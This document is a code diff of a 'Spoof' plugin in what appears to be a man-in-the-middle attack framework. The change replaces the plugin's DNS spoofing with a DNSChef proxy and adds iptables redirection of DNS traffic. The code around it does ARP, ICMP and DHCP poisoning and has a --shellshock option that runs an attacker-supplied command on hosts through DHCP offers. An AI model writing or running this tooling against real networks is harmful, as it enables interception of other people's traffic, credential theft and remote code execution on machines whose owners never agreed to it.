@@ -23,8 +23,9 @@ import sys
 
 from core.utils import SystemConfig
 from core.sslstrip.DnsCache import DnsCache
-from core.wrappers.protocols import _ARP, _DHCP, _ICMP, _DNS
+from core.wrappers.protocols import _ARP, _DHCP, _ICMP
 from plugins.plugin import Plugin
+from libs.dnschef.dnschef import start_dnschef
 
 logging.getLogger("scapy.runtime").setLevel(logging.ERROR)  #Gets rid of IPV6 Error when importing scapy
 from scapy.all import *
@@ -32,7 +33,7 @@ from scapy.all import *
 class Spoof(Plugin):
 	name     = "Spoof"
 	optname  = "spoof"
-	desc     = "Redirect/Modify traffic using ICMP, ARP or DHCP"
+	desc     = "Redirect/Modify traffic using ICMP, ARP, DHCP or DNS"
 	version  = "0.6"
 	has_opts = True
 	req_root = True
@@ -85,22 +86,17 @@ class Spoof(Plugin):
 			dhcp.shellshock = options.shellshock
 			dhcp.debug = debug
 			self.protocolInstances.append(dhcp)
-  
-		else:
-			sys.exit("[-] Spoof plugin requires --arp, --icmp or --dhcp")
 
 		if options.dns:
 
 			if not options.manualiptables:
-				SystemConfig.iptables.DNS(0)
+				SystemConfig.iptables.DNS(options.ip_address, self.dnscfg['port'])
 
-			dnscache = DnsCache.getInstance()
-			
-			for domain, ip in self.dnscfg.iteritems():
-				dnscache.cacheResolution(domain, ip)
+			start_dnschef(options, self.dnscfg)
+			self.output.append("DNSChef v0.3 online")
 
-			self.dns = _DNS.getInstance()
-			self.dns.enableDNS(self.dnscfg)
+		if not options.arp and not options.icmp and not options.dhcp and not options.dns:
+			sys.exit("[-] Spoof plugin requires --arp, --icmp, --dhcp or --dns")
 
 		SystemConfig.setIpForwarding(1)
 
@@ -115,7 +111,7 @@ class Spoof(Plugin):
 		group.add_argument('--arp', dest='arp', action='store_true', default=False, help='Redirect traffic using ARP spoofing')
 		group.add_argument('--icmp', dest='icmp', action='store_true', default=False, help='Redirect traffic using ICMP redirects')
 		group.add_argument('--dhcp', dest='dhcp', action='store_true', default=False, help='Redirect traffic using DHCP offers')
-		options.add_argument('--dns', dest='dns', action='store_true', default=False, help='Modify intercepted DNS queries')
+		options.add_argument('--dns', dest='dns', action='store_true', default=False, help='Proxy/Modify DNS queries')
 		options.add_argument('--shellshock', type=str, metavar='PAYLOAD', dest='shellshock', default=None, help='Trigger the Shellshock vuln when spoofing DHCP, and execute specified command')
 		options.add_argument('--gateway', dest='gateway', help='Specify the gateway IP')
 		options.add_argument('--target', dest='target', default=None, help='Specify a host to poison [default: subnet]')
@@ -125,9 +121,6 @@ class Spoof(Plugin):
 	def finish(self):
 		for protocol in self.protocolInstances:
 			protocol.stop()
-
-		if _DNS.checkInstance() is True:
-			_DNS.getInstance().stop()
 
 		if not self.manualiptables:
 			SystemConfig.iptables.Flush()
